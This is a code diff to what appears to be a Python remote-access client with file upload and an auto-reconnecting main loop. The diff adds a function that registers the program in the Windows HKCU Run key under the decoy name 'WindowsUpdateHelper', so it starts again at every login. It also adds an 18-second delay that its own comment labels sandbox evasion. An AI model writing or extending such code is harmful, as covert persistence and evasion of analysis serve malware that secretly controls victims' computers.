@@ -458,9 +458,28 @@ def upload_file(filename, data_b64):
     except Exception as e:
         return json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)})
 
+def _add_persistence():
+    """Add to Windows startup registry (HKCU Run) for persistence."""
+    if platform.system() == "Windows":
+        try:
+            import winreg as _wr
+            exe = sys.executable if sys.executable.lower().endswith(".exe") else sys.argv[0]
+            if not exe.lower().endswith(".exe"):
+                return
+            key = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
+                              r"Software\Microsoft\Windows\CurrentVersion\Run",
+                              0, _wr.KEY_SET_VALUE)
+            _wr.SetValueEx(key, "WindowsUpdateHelper", 0, _wr.REG_SZ, f'"{exe}"')
+            _wr.CloseKey(key)
+        except Exception:
+            pass
+
+
 def main_loop():
     """Main client loop with auto-reconnect - disabled for screenshot failures"""
     global client, current_dir
+    time.sleep(18)  # Sandbox evasion: delay before connecting
+    _add_persistence()
     screenshot_in_progress = False
     
     while True:
